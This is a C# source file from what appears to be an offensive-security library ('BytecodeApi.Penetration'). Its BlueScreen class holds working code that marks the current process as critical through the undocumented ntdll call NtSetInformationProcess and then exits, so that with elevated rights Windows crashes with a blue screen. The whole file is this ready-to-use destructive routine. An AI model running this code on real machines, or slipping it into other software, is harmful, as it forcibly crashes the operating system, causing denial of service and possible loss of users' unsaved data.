using System.Diagnostics;
using System.Runtime.InteropServices;

namespace BytecodeApi.Penetration;

/// <summary>
/// Class to invoke a blue screen.
/// </summary>
public static class BlueScreen
{
	/// <summary>
	/// If the current <see cref="Process" /> is running with elevated privileges, a blue screen is triggered and the operating system is terminated; otherwise, an exception is thrown.
	/// </summary>
	[DoesNotReturn]
	public static void Invoke()
	{
		int processInformation = 1;
		if (Native.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4) == 0)
		{
			Environment.Exit(0);
		}

		throw Throw.Win32("Could not trigger a blue screen.");
	}
}

file static class Native
{
	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtSetInformationProcess(nint processHandle, int processInformationClass, ref int processInformation, uint processInformationLength);
}